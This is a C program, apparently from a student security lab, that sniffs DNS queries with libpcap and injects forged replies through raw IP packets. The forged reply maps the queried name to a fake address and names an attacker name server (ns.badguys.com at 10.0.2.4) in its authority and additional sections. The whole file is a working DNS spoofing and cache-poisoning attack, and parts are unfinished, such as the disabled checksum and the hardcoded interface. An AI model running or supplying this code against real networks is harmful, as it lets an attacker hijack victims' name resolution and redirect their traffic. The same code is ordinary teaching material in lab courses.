#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/udp.h>
#include <sys/socket.h>

#include "myheader.h"


#define BUFSIZE 1500;

void spoof_DNS_reply(struct ipheader* ip);
unsigned short construct_dns_reply(char *buffer);
unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr);
unsigned short set_NS_record(char *buffer, char *name, char offset, char *name_server);



void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
printf("captured a dns packet\n");
  struct ethheader *eth = (struct ethheader *)packet;
  if (ntohs(eth->ether_type) == 0x0800) 
      spoof_DNS_reply((struct ipheader*)(packet + SIZE_ETHERNET));
};

int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  printf("buffsize %i\n",BUFSIZ);
  struct bpf_program fp;
  //char filter_exp[] = "port 23";
  // Don't sniff the packet from/to the specified ether address
  //char filter_exp[] = "not (ether host 08:00:27:c5:79:5f)";
  char filter_exp[] = "dst port 53";
  bpf_u_int32 net; 

  //Open live pcap session on NIC with name eth0
  handle = pcap_open_live("eth14", BUFSIZ, 1, 1000, errbuf);	  
  printf("handle is %p\n",handle);
  printf("errbuf is %s\n",errbuf);
  
  //Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net); 

  pcap_setfilter(handle, &fp); //Setup BPF code on the socket
  pcap_loop(handle, -1, got_packet, NULL); //Capture packets
  pcap_close(handle);   //Close the handle 
  return 0;
}

void spoof_DNS_reply(struct ipheader* ip)
{
    int ip_header_len = ip->iph_ihl * 4;
    char buffer[1500]; //removed const as a lazy fix to compiling error

    struct udpheader* udp = (struct udpheader *) ((u_char *)ip + ip_header_len);

    // make a copy from original packet to buffer(faked packet)
    memset((char*)buffer, 0, 1500);
    memcpy((char*)buffer, ip, ntohs(ip->iph_len));
    struct ipheader   * newip    = (struct ipheader *) buffer;
    struct udpheader * newudp = (struct udpheader *) 
                                  ((u_char *)buffer + ip_header_len);

    // Construct IP: swap src and dest in faked DNS packet
    newip->iph_sourceip = ip->iph_destip;
    newip->iph_destip = ip->iph_sourceip;
    newip->iph_ttl = 200;
    newip->iph_protocol = IPPROTO_UDP;
    newip->iph_flag= htons(0x00); 

    

    //Calculate the checksum for integrity. UDP checksum includes the data 
    newudp->udp_sum = 0; // Set it to zero first
  //  newudp->udp_sum = in_cksum((unsigned short *)newudp, ntohs(ip->iph_len) - ip_header_len);
    newudp->udp_sport = (udp->udp_dport);
    newudp->udp_dport = (udp->udp_sport);

    int increment = 8 + (newip->iph_ihl * 4);

    //DNS bit here
    //int udp_header_len = ip->iph_ihl * 4;
    
    struct dnsheader* dns = (struct dnsheader *) ((u_char *)udp + 8);//udp packet always 8 bytes
    int dnsSectionLength = construct_dns_reply(buffer + increment);
    newip->iph_len = htons(increment + dnsSectionLength);
    newudp->udp_ulen = htons(dnsSectionLength + 8);
    send_raw_ip_packet(newip);
}


/*Need to dynamically access eth# of attacking machine*/
/*string get_eth()
{

}*/

/*Construct DNS Header and Records. Return the size (Header + Records)*/
unsigned short construct_dns_reply(char *buffer)
{
	


	struct dnsheader *dns = (struct dnsheader *) buffer;

	char *copyOfP = buffer + 12;

	char TARGET_DOMAIN[] = "www.bbc.co.uk";
	char ANSWER_IPADDR[] = "1.2.3.4";
	char NS_SERVER[] = "\x02\x6e\x73\x07\x62\x61\x64\x67\x75\x79\x73\x03\x63\x6f\x6d";
	char NS_IPADDR[] = "10.0.2.4";

	//construct the DNS header:
	dns->flags=htons(0x8180); //Flag = response; this is a DNS response

	//the number for certain fields
	dns->QDCOUNT=htons(1); // 1 question field
	dns->ANCOUNT=htons(1); // 1 answer field
	dns->NSCOUNT=htons(1); // 1 name server(authority) field
	dns->ARCOUNT=htons(1); // 1 additional fields

	char *p = buffer + 12; // move the pointer to the beginning of DNS data

	/*if(strstr(p, TARGET_DOMAIN) == NULL){
		return 0;		//only target one specific domain
	}*/

	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)

	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
	p += set_NS_record(p, NULL, 0x0C, NS_SERVER); //Add an NS record (Authority section)
	p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
	//printf("dns Length is %i",(p - buffer));
	return p - buffer;
}

/*Construct an "A" record, and return the total size of the record.
If name is NULL, use the offset parameter to construct the "name" field.
If name is not NULL, copy it to the "name" field, and ignore the offset parameter.*/
unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
{
	char *p = buffer;

	if(name == NULL){
		*p = 0xC0;
		p++;
		*p = offset;
		p++;
	} else {
		strcpy(p, name);
		p += strlen(name) + 1;
	}

	*((unsigned short *)p ) = htons(0x01);	//Record Type
	p += 2;

	*((unsigned short *)p ) = htons(0x01);	//Class
	p += 2;

	*((unsigned int *)p ) = htonl(0x2222);	//Time to Live
	p += 4;

	*((unsigned short *)p ) = htons(0x04);	//Data Length (always 4. 1 byte per ip addr section)
	p += 2;

	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
	p += 4;
	//printf("A record is %i", \n, );
	return (p-buffer);

}

/*Construct an NS section to DNS response payload. (Authority section)*/
/*NOTE: Not sure about what to do if name==NULL. Taken from set_A_record*/
unsigned short set_NS_record(char *buffer, char *name, char offset, char *name_server)
{
	char *p = buffer;

	if(name == NULL){
		*p = 0xC0;
		p++;
		*p = offset;
		p++;
	} else {
		strcpy(p, name);
		p += strlen(name) + 1;
	}

	*((unsigned short *)p ) = htons(0x0002);	//Record Type
	p += 2;

	*((unsigned short *)p ) = htons(0x0001);	//Class
	p += 2;

	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live
	p += 4;

	*((unsigned short *)p ) = htons(0x10);		//Data Length (fix to make dynamic for size of )
	p += 2;

//	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address


	//Name Server (need to update)
	if(name_server == NULL){
		*p = 0xC0;
		p++;
		*p = offset;
		p++;
	} else {
		strcpy(p, name_server);
		p += strlen(name_server) ;
	}
	*p = '\0';
	p++;

	return (p-buffer);

}